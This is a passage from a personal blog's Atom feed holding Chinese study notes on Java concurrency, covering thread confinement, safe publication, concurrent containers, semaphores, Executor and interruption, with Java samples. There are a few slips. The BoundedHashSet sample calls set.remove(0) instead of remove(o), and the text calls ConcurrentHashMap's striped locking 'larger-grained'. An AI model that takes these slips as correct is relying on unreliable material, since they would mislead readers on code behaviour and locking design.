<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>一位可可爱爱的编橙爱好者</title>
  <icon>https://www.gravatar.com/avatar/560d60bc4bbfec4b10e3ea23f4d15430</icon>
  <subtitle>欢迎来到爱的小屋</subtitle>
  <link href="https://a2914475618.github.io/atom.xml" rel="self"/>
  
  <link href="https://a2914475618.github.io/"/>
  <updated>2021-11-25T05:17:37.614Z</updated>
  <id>https://a2914475618.github.io/</id>
  
  <author>
    <name>Lu sir</name>
    <email>2914475618@qq.com</email>
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>图解TCP/IP</title>
    <link href="https://a2914475618.github.io/2021/11/25/%E5%9B%BE%E8%A7%A3TCP-IP/"/>
    <id>https://a2914475618.github.io/2021/11/25/%E5%9B%BE%E8%A7%A3TCP-IP/</id>
    <published>2021-11-25T05:06:39.000Z</published>
    <updated>2021-11-25T05:17:37.614Z</updated>
    
    <content type="html"><![CDATA[<h1 id="TCP-IP"><a href="#TCP-IP" class="headerlink" title="TCP/IP"></a>TCP/IP</h1><h2 id="1-网络基础知识"><a href="#1-网络基础知识" class="headerlink" title="1.网络基础知识"></a>1.网络基础知识</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;TCP-IP&quot;&gt;&lt;a href=&quot;#TCP-IP&quot; class=&quot;headerlink&quot; title=&quot;TCP/IP&quot;&gt;&lt;/a&gt;TCP/IP&lt;/h1&gt;&lt;h2 id=&quot;1-网络基础知识&quot;&gt;&lt;a href=&quot;#1-网络基础知识&quot; class=&quot;headerlink&quot; </summary>
      
    
    
    
    
    <category term="TCP/IP" scheme="https://a2914475618.github.io/tags/TCP-IP/"/>
    
  </entry>
  
  <entry>
    <title>JAVA并发编程</title>
    <link href="https://a2914475618.github.io/2021/11/22/JAVA%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/"/>
    <id>https://a2914475618.github.io/2021/11/22/JAVA%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/</id>
    <published>2021-11-22T10:48:31.000Z</published>
    <updated>2021-12-01T12:58:35.758Z</updated>
    
    <content type="html"><![CDATA[<h1 id="JAVA并发编程"><a href="#JAVA并发编程" class="headerlink" title="JAVA并发编程"></a>JAVA并发编程</h1><h2 id="2-线程安全性"><a href="#2-线程安全性" class="headerlink" title="2.线程安全性"></a>2.线程安全性</h2><p>对象的状态是存储在实例或静态域中的数据，可能还包括其他依赖对象的域。</p><h3 id="2-1-什么是线程安全性"><a href="#2-1-什么是线程安全性" class="headerlink" title="2.1 什么是线程安全性"></a>2.1 什么是线程安全性</h3><p>当多个线程访问某个类时，这个类始终都能表现出正确的行为，那么就称这个类是线程安全的。</p><p><strong>无状态的对象一定是线程安全的。</strong></p><h3 id="2-2-原子性"><a href="#2-2-原子性" class="headerlink" title="2.2 原子性"></a>2.2 原子性</h3><h4 id="2-2-1-竞态条件"><a href="#2-2-1-竞态条件" class="headerlink" title="2.2.1 竞态条件"></a>2.2.1 竞态条件</h4><p>某个计算的正确性取决于多个线程的交替执行时序时，就会发生竞态条件。</p><p>常见的竞态条件就是—–先检查后执行。</p><h4 id="2-2-2-复合操作"><a href="#2-2-2-复合操作" class="headerlink" title="2.2.2 复合操作"></a>2.2.2 复合操作</h4><p>原子操作是指，对于访问同一个状态的所有操作来说，这个操作是以原子方式执行的操作。要么不执行，要么全部执行完。</p><p>先检查后执行+读取、修改、写入等操作称为复合操作。</p><h3 id="2-3-加锁机制"><a href="#2-3-加锁机制" class="headerlink" title="2.3 加锁机制"></a>2.3 加锁机制</h3><h2 id="3-对象的共享性"><a href="#3-对象的共享性" class="headerlink" title="3.对象的共享性"></a>3.对象的共享性</h2><h3 id="3-1可见性"><a href="#3-1可见性" class="headerlink" title="3.1可见性"></a>3.1可见性</h3><h3 id="3-2-发布与逸出"><a href="#3-2-发布与逸出" class="headerlink" title="3.2 发布与逸出"></a>3.2 发布与逸出</h3><p><strong>发布</strong>：使一个对象能够在当前作用域之外的代码中使用。</p><p><strong>逸出</strong>：当某个不应该发布的对象被发布</p><p>发布对象最简单的方法就是<strong>将对象的引用保存到一个公有的静态变量中，以便任何类和线程都能看见该对象。</strong></p><p>使用封装的最主要原因：<strong>封装能够使得对程序的正确性进行分析变得可能，并使得无意中破坏设计约束条件变得更难。</strong></p><h3 id="3-3-线程封闭"><a href="#3-3-线程封闭" class="headerlink" title="3.3 线程封闭"></a>3.3 线程封闭</h3><p><strong>线程封闭</strong>：不共享数据。如果仅在单线程内访问数据，就不需要同步。某个对象封闭在一个线程中，这种用法将自动实现线程安全性。</p><p>Swing中大量使用了线程封闭技术。还有**JDBC(**JAVA DATABASE CONNECTIVITY)中的Connection对象。</p><h4 id="3-3-1-Ad-hoc-线程封闭"><a href="#3-3-1-Ad-hoc-线程封闭" class="headerlink" title="3.3.1 Ad-hoc 线程封闭"></a>3.3.1 Ad-hoc 线程封闭</h4><p>指的是<strong>维护线程封闭性的职责完全由程序实现来承担。</strong></p><p>对线程封闭对象的引用通常保存在共有变量中。当决定使用线程封闭技术时，通常是因为要将某个特定的子系统实现为一个单线程子系统。</p><h4 id="3-3-2-栈封闭"><a href="#3-3-2-栈封闭" class="headerlink" title="3.3.2 栈封闭"></a>3.3.2 栈封闭</h4><p>栈封闭是线程封闭的一种特例。<strong>栈封闭中，只能通过局部变量才能访问对象</strong>。</p><p>局部变量的固有属性之一就是封闭在执行线程中，他们位于执行线程的栈中，其他线程无法访问这些栈。</p><h4 id="3-3-3-ThreadLocal类"><a href="#3-3-3-ThreadLocal类" class="headerlink" title="3.3.3 ThreadLocal类"></a>3.3.3 ThreadLocal类</h4><p>线程封闭性更好的一种规范是使用ThreadLocal，<strong>这个类能使线程中的某个值与保存值的对象关联起来。</strong></p><p>ThreadLocal提供了get与set等访问接口方法，<strong>这些方法为每个使用该变量的线程都有一份独立的副本，因此get总是返回由当前执行线程在调用set时设置的最新值。</strong></p><p>ThreadLocal对象通常用于防止对可变的单实例变量或全局变量进行共享。例如JDBC中的Connection对象。</p><p>当某个频繁执行的操作需要一个临时对象，例如一个缓冲区，同时又希望避免每次执行时都重新分配该临时对象，就可以使用这个技术。</p><p>你可以将ThreadLocal<T>视为Map&lt;Thread,T&gt;的对象，其中保存了特定于该线程的值。这些特定于线程的值保存在Thread对象中，当线程终止后，这些值将会作为垃圾回收。</p><h3 id="3-4-不变性"><a href="#3-4-不变性" class="headerlink" title="3.4 不变性"></a>3.4 不变性</h3><p>如果某个对象在被创建后其状态就不能被修改，该对象就被称为不可变对象。</p><p>不可变对象一定是线程安全的。</p><p>满足以下条件时，对象是不可变的：</p><ol><li><p>对象创建以后其状态就不能修改</p></li><li><p>对象的所有域都是dinal类型</p></li><li><p>对象是正确创建的（对象的创建期间，this引用没有逸出）</p><blockquote><p>即使对象中所有的域都是final类型，这个对象也仍然是可变的,因为final类型中可以保存对可变对象的引用。</p></blockquote></li></ol><h4 id="3-4-1-Final-域"><a href="#3-4-1-Final-域" class="headerlink" title="3.4.1 Final 域"></a>3.4.1 Final 域</h4><p>关键词final用于构造不可变性对象。final类型的域是不能修改的。但是可能final修饰的引用对象是可变的</p><p>final域能确保初始化过程的安全性，从而可以不受限制地访问不可变对象，并在共享这些对象时无需同步。</p><h3 id="3-5-安全发布"><a href="#3-5-安全发布" class="headerlink" title="3.5 安全发布"></a>3.5 安全发布</h3><h4 id="3-5-2-不可变对象与初始化安全性"><a href="#3-5-2-不可变对象与初始化安全性" class="headerlink" title="3.5.2 不可变对象与初始化安全性"></a>3.5.2 不可变对象与初始化安全性</h4><p>维持初始化安全性，必须满足不可变性的所有要求：</p><ol><li>状态不可修改</li><li>所有域都是final</li><li>正确的构造过程</li></ol><h4 id="3-5-3-安全发布的常用模式"><a href="#3-5-3-安全发布的常用模式" class="headerlink" title="3.5.3  安全发布的常用模式"></a>3.5.3  安全发布的常用模式</h4><p>可变对象必须通过安全的方式来发布，通常意味着在发布和使用该对象的线程时都必须使用同步。</p><p>要安全地发布一个对象，对象的引用以及对象的状态必须同时对其他线程可见。一个正确构造的对象可以通过以下方式来安全地发布：</p><ol><li>在静态初始化函数中初始化一个对象引用</li><li>将对象的引用保存到volatile类型的域或者AtomicReferance对象中。</li><li>将对象的引用保存到某个正确构造对象的final类型中</li><li>将对象的引用保存到一个由锁保护的域中。</li></ol><p>对象的发布需求取决于它的可变性：</p><ol><li>不可变对象可以通过任何机制来发布</li><li>事实不可变对象必须通过安全方式来发布</li><li>可变对象必须通过安全方式来发布，并且必须时线程安全的或者由某个锁保护起来</li></ol><h4 id="3-5-4-安全地共享对象"><a href="#3-5-4-安全地共享对象" class="headerlink" title="3.5.4 安全地共享对象"></a>3.5.4 安全地共享对象</h4><p>并发程序中使用和共享对象，使用的策略：</p><ol><li><strong>线程封闭</strong>。线程封闭的对象只能有一个线程拥有，对象被封闭在该线程中，并且只能由这个线程修改。</li><li><strong>只读共享</strong>。共享的只读对象可以由多个线程并发访问，但是任何线程都不能修改它。包括不可变对象和事实不可变对象。</li><li><strong>线程安全共享</strong>。线程安全的对象在其内部实现同步，因此多个线程可以通过对象的共有接口来进行访问而不需要进一步的同步。</li><li><strong>保护对象</strong>。被保护的对象只能通过持有特定锁来访问。保护对象包括封装在其他线程安全对象中的对象，以及已发布的并且由某个特定锁保护的对象。</li></ol><h2 id="4-对象的组合"><a href="#4-对象的组合" class="headerlink" title="4.对象的组合"></a>4.对象的组合</h2><p>委托是创建线程安全类的一个有效的策略：只需让现有的线程安全类管理所有的状态即可。</p><p>客户端加锁是指，<strong>对于使用某个对象X的客户端代码，使用X本身用于保护其状态的锁来保护这段客户代码。</strong></p><h2 id="5-基本构建模块"><a href="#5-基本构建模块" class="headerlink" title="5.基本构建模块"></a>5.基本构建模块</h2><h3 id="5-1-同步容器类"><a href="#5-1-同步容器类" class="headerlink" title="5.1 同步容器类"></a>5.1 同步容器类</h3><p>同步容器类包括Vector和Hashtable。这些同步的封装器类由Collections.synchronizedXXX等工厂方法创建的。</p><p>这些类实现线程安全的方法是：<strong>将它们的状态封装起来，并对每个公有方法都进行同步，使得每一次只有一个线程能访问容器的状态。</strong></p><p><strong>同步容器将所有对容器状态的访问都串行化，以实现他们的线程安全性</strong>。代价是严重降低并发性，当多个线程竞争容器的锁时，吞吐量将严重降低。</p><h3 id="5-2-并发容器"><a href="#5-2-并发容器" class="headerlink" title="5.2 并发容器"></a>5.2 并发容器</h3><p><strong>并发容器是针对多个线程并发访问设计的。</strong></p><p>Java 5.0 用Concurrent-hashmap来替代同步且基于散列的map</p><p>用CopyOnWriteArrayList用于在遍历操作为只要操作的情况下替代同步的list。</p><p>在ConcurrentMap接口中增加了对一些常见复合操作的支持，如“若没有则添加”、替换以及有条件删除等。</p><p>java 5.0 新增了Queue 和 BlockingQueue。Queue用来临时保存一组等待处理的元素，提供了集中实现ConcurrentLinkedQueue,这是一个传统的先进先出队列，以及PriorityQueue,这是一个优先队列（非并发的）。</p><p>Queue是非阻塞的，如果队列为空，那么获取的元素将返回空值。</p><p>BlockingQueue扩展了Queue，增加了可阻塞的插入和获取等操作。如果队列为空，那么获取元素的操作将一致阻塞，直到队列中出现可用的空间。如果队列已满，那么插入元素的操作将一直阻塞，直到队列中出现可用的空间。</p><p>ConcurrentHashMap并不是将每个方法都在同一个锁上同步并使得每次只能有一个线程访问容器，而是使用一种粒度更大的加锁机制来实现更大程度的共享，这种机制称为分段锁</p><ul><li>任意数量的读取线程可以并发地访问Map，执行读取操作的线程和执行写入操作的线程可以并发的修改map。</li></ul><hr><p>CopyOnWriteArrayList用于替代同步List，提供更好的并发性能，迭代期间不需要对容器进行加锁或复制。</p><p>线程安全性在于只要正确地发布一个事实不可变的对象，那么在访问该对象时就不再需要进一步的同步。在每次修改时，都会创建并重新发布一个新的容器副本，从而实现可变性。</p><p>每当修改时都会复制底层数组，这需要一定的开销。仅仅当迭代操作远远多于修改操作时，菜应该使用”写入时复制”容器。</p><h3 id="5-3-阻塞队列和生产者–消费者模式"><a href="#5-3-阻塞队列和生产者–消费者模式" class="headerlink" title="5.3 阻塞队列和生产者–消费者模式"></a>5.3 阻塞队列和生产者–消费者模式</h3><p><strong>阻塞队列适合生产者–消费者模式。</strong></p><h4 id="5-3-2-串行线程封闭"><a href="#5-3-2-串行线程封闭" class="headerlink" title="5.3.2 串行线程封闭"></a>5.3.2 串行线程封闭</h4><h4 id="5-3-3-双端队列与工作密取"><a href="#5-3-3-双端队列与工作密取" class="headerlink" title="5.3.3 双端队列与工作密取"></a>5.3.3 双端队列与工作密取</h4><p>java 6中增加了deque 和 blockingDeque。Deque是一个双端队列，实现了在队列头和队列尾的高效插入和删除。</p><p><strong>双端队列适用于工作密取模式。</strong></p><p>工作密取：当双端队列为空时，它会在另一个线程的队列队尾查找新的任务，从而确保每个线程都保持忙碌状态。</p><h3 id="5-4-阻塞方法和中断方法"><a href="#5-4-阻塞方法和中断方法" class="headerlink" title="5.4 阻塞方法和中断方法"></a>5.4 阻塞方法和中断方法</h3><p>当某方法抛出一个Interrupted-Exception，表示该方法是一个阻塞方法。</p><h3 id="5-5-同步工具类"><a href="#5-5-同步工具类" class="headerlink" title="5.5 同步工具类"></a>5.5 同步工具类</h3><p>阻塞队列也可以作为同步工具类。</p><p>同步工具类包括</p><ol><li>信号量(Semaphore)</li><li>栅栏(Barrier)</li><li>闭锁(latch)</li></ol><p>他们封装了一些状态，这些状态将决定执行同步工具类的线程时继续执行 还是等待，还提供了一些方法对状态进行操作，以及另一些方法用于高效地等待同步工具类进入到预期状态。</p><h4 id="5-5-1-闭锁"><a href="#5-5-1-闭锁" class="headerlink" title="5.5.1 闭锁"></a>5.5.1 闭锁</h4><p>延迟线程的进度直到终止状态。在闭锁到达状态结束之前，这扇门是关闭的，没有任何线程能通过，当到达结束时，这扇门会打开并允许所有的线程通过。</p><p>常用的场景：1.<strong>确保某个计算在其需要的所有资源都被初始化之后才继续执行。</strong>2.<strong>确保某个服务在其依赖的所有其他服务都已经启动之后才启动。</strong>3.<strong>等到某个操作的参与者都就绪再继续执行。</strong></p><p>第一种实现方法是使用CountDownLatch类：它可以使一个或多个线程等待一组事件发生。闭锁状态包括一个计数器，<strong>计数器被初始化为一个正数，表示需要等待的事件数量。</strong></p><h4 id="5-5-2-Future-Task"><a href="#5-5-2-Future-Task" class="headerlink" title="5.5.2 Future Task"></a>5.5.2 Future Task</h4><p>也可以用作闭锁。Future Task表示的计算是通过Callable来实现的，相当于一种可生成结果的Runnable。</p><p>有三种状态：</p><ol><li>等待运行</li><li>正在运行</li><li>运行完成</li></ol><p>Future.get的行为取决于任务的状态，若任务完成则会立即返回结果。否则get将阻塞直到任务进入完成状态。</p><p>Callable表示的任务可以抛出受检查的或未受检查的异常，任何代码都可能抛出一个Error。</p><h4 id="5-5-3-信号量"><a href="#5-5-3-信号量" class="headerlink" title="5.5.3 信号量"></a>5.5.3 信号量</h4><p>计数信号量用来控制同时访问某个特定资源的操作数量。或者同时执行某个指定操作的数量。通过构造函数来指定初始许可数量。</p><p>Semaphore的操作过程：</p><ol><li>再执行操作时获取acquire许可，若没有，那么acquire将阻塞，直到有许可</li><li>使用以后通过release方法返回一个许可给信号量</li></ol><p>可以<strong>使用该技术来将任何一种容器变成有界阻塞容器</strong>。信号量的计数值会初始化为容器容量的最大值。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span>  <span class="class"><span class="keyword">class</span> <span class="title">BoundedHashSet</span>&lt;<span class="title">T</span>&gt;</span>&#123;</span><br><span class="line">       <span class="keyword">private</span> <span class="keyword">final</span> Set&lt;T&gt; set;</span><br><span class="line">       <span class="keyword">private</span> <span class="keyword">final</span> Semaphore sem;</span><br><span class="line">       </span><br><span class="line">       <span class="function"><span class="keyword">public</span>  <span class="title">BoundedHashSet</span><span class="params">(<span class="keyword">int</span> bound)</span></span>&#123;</span><br><span class="line">           <span class="keyword">this</span>.set= Collections.synchronizedSet(<span class="keyword">new</span> HashSet&lt;T&gt;());</span><br><span class="line">           sem=<span class="keyword">new</span> Semaphore(bound);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">add</span><span class="params">(T o)</span><span class="keyword">throws</span>  InterruptedException</span>&#123;</span><br><span class="line">           sem.acquire();</span><br><span class="line">           <span class="keyword">boolean</span> wasAdded=<span class="keyword">false</span>;</span><br><span class="line">           <span class="keyword">try</span>&#123;</span><br><span class="line">               wasAdded=set.add(o);</span><br><span class="line">               <span class="keyword">return</span> wasAdded;</span><br><span class="line">           &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">               <span class="keyword">if</span>(!wasAdded)&#123;</span><br><span class="line">                   sem.release();</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       </span><br><span class="line">       <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">remove</span><span class="params">(Object o)</span></span>&#123;</span><br><span class="line">           <span class="keyword">boolean</span> wasRemoved=set.remove(<span class="number">0</span>);</span><br><span class="line">           <span class="keyword">if</span>(wasRemoved)&#123;</span><br><span class="line">               sem.release();</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="keyword">return</span> wasRemoved;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h4 id="5-5-4-栅栏"><a href="#5-5-4-栅栏" class="headerlink" title="5.5.4 栅栏"></a>5.5.4 栅栏</h4><p>通过闭锁来启动一组相关的操作，或者等待一组相关的操作结束。闭锁是一次性对象，一旦进入终止状态，就不能被重置。</p><p>栅栏与闭锁类似，能阻塞一组线程直到某个事件发生。</p><p>栅栏与闭锁的区别在于：<strong>所有线程必须同时到达栅栏位置，才能继续执行。闭锁用于等待事件，而栅栏用于等待其他线程。</strong></p><p>CyclicBarrier可以使一定数量的参与方反复地再栅栏位置汇集。当线程到达栅栏位置时将调用await方法，阻塞直到所有线程都能到达栅栏位置。如果所有线程都到达了栅栏位置，那么栅栏将打开，所有线程都被释放，栅栏将被重置供下次使用。</p><p>如果成功的通过了栅栏，那么await将为每个线程返回一个唯一的到达索引号，通过这些索引号来产生一个领导线程，再下一次迭代中执行一些特殊的工作。</p><h3 id="5-6-构建高效且可伸缩的结果缓存"><a href="#5-6-构建高效且可伸缩的结果缓存" class="headerlink" title="5.6 构建高效且可伸缩的结果缓存"></a>5.6 构建高效且可伸缩的结果缓存</h3><h3 id="5-7-第一章小结"><a href="#5-7-第一章小结" class="headerlink" title="5.7 第一章小结"></a>5.7 第一章小结</h3><blockquote><p>所有的并发问题都可以归结为如何协调对并发状态的访问。可变状态越少，就越容易确保线程安全性。</p><p>尽量将域声明为final类型，除非需要他们是可变的</p><p>不可变对象一定是线程安全的</p><p>封装有利于管理复杂性</p><p>用锁来保护每一个可变变量</p><p>当保护同一个不变性条件中的所有变量时，要使用同一个锁</p><p>再执行复合操作期间时，需要持有锁。</p><p>如果从多个线程中访问同一个可变变量时没有同步机制，程序会有问题</p></blockquote><h2 id="6-任务执行"><a href="#6-任务执行" class="headerlink" title="6.任务执行"></a>6.任务执行</h2><h3 id="6-1-在线程中执行任务"><a href="#6-1-在线程中执行任务" class="headerlink" title="6.1 在线程中执行任务"></a>6.1 在线程中执行任务</h3><h4 id="6-1-1-串行地执行任务"><a href="#6-1-1-串行地执行任务" class="headerlink" title="6.1.1 串行地执行任务"></a>6.1.1 串行地执行任务</h4><p>每次只处理一个请求，通常会由于网络阻塞或连通性问题而被阻塞。</p><h4 id="6-1-2-显式地为任务创建线程"><a href="#6-1-2-显式地为任务创建线程" class="headerlink" title="6.1.2 显式地为任务创建线程"></a>6.1.2 显式地为任务创建线程</h4><p>为每个请求创建一个新的线程来提供服务，实现更高的响应性。（增加了资源消耗）</p><h4 id="6-1-3-无限制创建线程的不足"><a href="#6-1-3-无限制创建线程的不足" class="headerlink" title="6.1.3 无限制创建线程的不足"></a>6.1.3 无限制创建线程的不足</h4><ol><li>线程生命周期的开销非常高</li><li>资源消耗</li><li>稳定性</li></ol><h3 id="6-2-Executor框架"><a href="#6-2-Executor框架" class="headerlink" title="6.2 Executor框架"></a>6.2 Executor框架</h3><p>线程池简化了线程的管理工作，并且juc提供了一种灵活的线程池实现作为Executor框架的一部分。</p><p>Executor支持多种不同类型的任务执行策略。提供了一种标准的方法将任务的提交过程域执行过程解耦开来，并用Runnable来表示任务。Executor的实现还提供了对生命周期的支持，以及统计信息收集，应用程序管理机制和性能监视等机制。</p><p>Executor基于生产者-消费者模式。将任务提交与任务执行解耦开来</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TaskExecutionWebServer</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span>  <span class="keyword">final</span> <span class="keyword">int</span> NTHREADS=<span class="number">100</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span>  <span class="keyword">final</span> Executor exec= Executors.newFixedThreadPool(NTHREADS);</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">            ServerSocket socket=<span class="keyword">new</span> ServerSocket(<span class="number">80</span>);</span><br><span class="line">            <span class="keyword">while</span>(<span class="keyword">true</span>)&#123;</span><br><span class="line">                <span class="keyword">final</span> Socket connection=socket.accept();</span><br><span class="line">                Runnable task=<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">//                        handleRequest(connection;</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;;</span><br><span class="line">                exec.execute(task);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>通常使用<strong>Executor</strong>来替代<strong>new Thread(runnable).start()  这个将任务提交与执行放在一起了</strong></p><h4 id="6-2-3-线程池"><a href="#6-2-3-线程池" class="headerlink" title="6.2.3 线程池"></a>6.2.3 线程池</h4><p><strong>线程池，管理一组同构工作线程的资源池。</strong></p><p>线程池与工作队列密切相关，在工作队列中保存了所有等待执行的任务。</p><ol><li>重用现有的线程而不是创建新的线程，可以在处理多个请求时分摊在线程创建和销毁过程中产生的巨大开销。</li><li>当请求到达时，工作线程已经存在，因此不会由于等待创建线程而延迟任务的执行，提高了响应。</li><li>适当调整线程池的大小，可以创建足够多的线程以使处理器保持忙碌状态，防止过多线程相互竞争资源而使应用程序耗尽内存或失败。</li></ol><p><strong>使用Executor中的静态工厂方法创建线程池：</strong></p><table><thead><tr><th>方法</th><th>内容</th></tr></thead><tbody><tr><td>newFixedThreadPool</td><td>创建一个固定长度的线程池</td></tr><tr><td>newCachedThreadPool</td><td>创建一个可缓存的线程池，如果当前规模超过了处理需求，回收空闲的线程，反之，则添加</td></tr><tr><td>newSingleThreadExecutor</td><td>是一个单线程的Executor，创建单个工作线程来执行任务，若发生异常，则创建一个代替</td></tr><tr><td>newScheduledThreadPool</td><td>创建一个固定长度的线程池，而且以延迟或定时的方式来执行任务。</td></tr></tbody></table><h4 id="6-2-4-Executor-的生命周期"><a href="#6-2-4-Executor-的生命周期" class="headerlink" title="6.2.4 Executor 的生命周期"></a>6.2.4 Executor 的生命周期</h4><p>Executor实现通常会创建线程来执行任务。但JVM只有在所有（非守护）线程全部终止后才会退出，因此如果无法正确地关闭Executor，JVM将无法结束。</p><p> ExecutorService扩展了Executor接口，添加了一些用于生命周期管理的方法。</p><p>ExecutorService的生命周期有3种状态：运行、关闭、已终止。</p><h4 id="6-2-5-延迟任务与周期任务"><a href="#6-2-5-延迟任务与周期任务" class="headerlink" title="6.2.5 延迟任务与周期任务"></a>6.2.5 延迟任务与周期任务</h4><p><strong>通过使用ScheduledThreadPoolExecutor来代替Timer类来实现管理延迟任务以及周期任务。</strong></p><p>Timer在执行所有定时任务时只会创建一个线程。如果某个任务的执行时间过长，那么将会破坏其他TimerTask的定时精确性。</p><p>如果有一个TimerTask抛出了一个未检查的异常，Timer线程并不捕获异常，因此当TimerTask抛出未检查异常时，将终止定时线程。Timer也不会恢复线程的执行，错误地认为整个Timer都被取消了。</p><p><strong>线程泄露：已经被调度但尚未执行的TimerTask将不会再执行，新的任务也不能被调度。</strong></p><p>Timer支持基于绝对时间而不是相对时间的调度机制，任务对系统始终变化很敏感，而ScheduledThreadPoolExecutor只支持基于相对时间的调度。</p><p>java 5.0后，很少使用Timer，如果要构建自己的调度服务，可以使用DelayQueue,实现了BlockingQueue，并为ScheduledThreadPoolExecutor提供调度功能。</p><h3 id="6-3-找出可利用的并行性"><a href="#6-3-找出可利用的并行性" class="headerlink" title="6.3 找出可利用的并行性"></a>6.3 找出可利用的并行性</h3><h4 id="6-3-2-携带结果的Callable与Future"><a href="#6-3-2-携带结果的Callable与Future" class="headerlink" title="6.3.2 携带结果的Callable与Future"></a>6.3.2 携带结果的Callable与Future</h4><p>Executor框架使用Runnbale作为其基本的任务表示形式。Runnable是一种有很大局限的抽象，它不能返回一个值或抛出一个受检查的异常。</p><p>Callable是一种更好的抽象：它认为主入口点(即call)将返回一个值，并可能抛出一个异常。</p><p>Executor执行的任务有4个生命周期阶段：创建、提交、开始和完成。</p><p>在Executor框架中，已提交但尚未开始的任务可以取消，但那些已经开始执行的任务，只有当它们能响应中断时，才能取消。</p><p><strong>Future表示一个任务的生命周期，并提供了相应的方法来判断是否已经完成或取消，以及获取任务的结果和取消任务等。</strong></p><p>get方法的行为取决于任务的状态（未开始，正在运行，已完成）。如果任务已经完成，get会立即返回或者抛出一个Execption。如果任务没有完成，那么get将会阻塞直到任务完成。</p><h4 id="6-3-5-CompletionService-Executor与BlockingQueue"><a href="#6-3-5-CompletionService-Executor与BlockingQueue" class="headerlink" title="6.3.5 CompletionService: Executor与BlockingQueue"></a>6.3.5 CompletionService: Executor与BlockingQueue</h4><p>CompletionServie 将Executor和Blocking的功能融合在一起。将Callable任务提交给他执行，然后使用类似take和pol等方法来获得已完成的结果，而这些结果会在完成时封装为Future。</p><p>计算部分交给Executor,任务完成得记录保存在BlockingQueue。在构造函数中创建一个BlockingQueue来保存计算完成得结果。计算完成时，调用FutureTask中的done方法。提交某个任务时，将将任务包装为一个QueueingFuture，这是FuntureTask的子类，改写其中的done方法，将结果放入BlockingQueue。</p><blockquote><p>继承于Executor的类如ExecutorService和CompleationService都有submit方法用来提交任务</p><p>ExecutorService有invokeAll方法，将多个任务提交到一个ExecutorService并获得结果。</p><p>实现Future接口的类如FutureTask有get方法，可以设置等待时间，若超过时间就cancled</p></blockquote><h2 id="7-取消与关闭"><a href="#7-取消与关闭" class="headerlink" title="7.取消与关闭"></a>7.取消与关闭</h2><p>java没有提供任何机制来安全地终止一个线程。但它提供了中断，这是一种协作机制，能够使一种线程终止另一个线程的工作。这种协作机制是很有必要的，我们不希望某个任务、线程或服务立即停止，<strong>停止会使共享的数据结构处于不一致的状态。</strong></p><blockquote><p>Thread.stop  和 suspend等方法有严重的缺陷，我们应该避免使用。</p></blockquote><h3 id="7-1-任务取消"><a href="#7-1-任务取消" class="headerlink" title="7.1 任务取消"></a>7.1 任务取消</h3><p>有一种机制能设置某个“已请求取消”标志，而任务将定期查看该标志。如果设置了这个标志，那么任务将提前结束。</p><h4 id="7-1-1-中断"><a href="#7-1-1-中断" class="headerlink" title="7.1.1 中断"></a>7.1.1 中断</h4><p>线程中断是一种协作机制，线程可以通过该机制通知另一个线程，告诉它在合适的或者可能的情况下停止当前工作，并转而执行其他的工作。</p><p>每个线程都有一个boolean类型的中断状态。当中断线程，这个线程的中断状态将被设置为true。Thread中包含了中断线程以及查询线程中断状态的方法。</p><blockquote><p>interrupt方法能中断目标线程</p><p>isInterrupted方法能返回目标线程的中断状态</p><p>静态的interrupted方法将清除当前线程的中断状态，并返回它之前的值。</p></blockquote><p>中断的正确理解：它并不会真正地中断一个正在运行的线程，而只是发出中断请求，然后再下一个合适的时刻中断自己。</p><p>再使用静态的interrupted时应该小心，因为它会清楚当前线程的中断状态。如果再调用interrupted时返回了true，那么除非你想屏蔽这个中断，否则必须对它进行处理——可以抛出InterruptedException，或者通过再次调用interrupt来恢复中断。</p><p><strong>使用中断来代替标志位进行任务取消</strong>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span 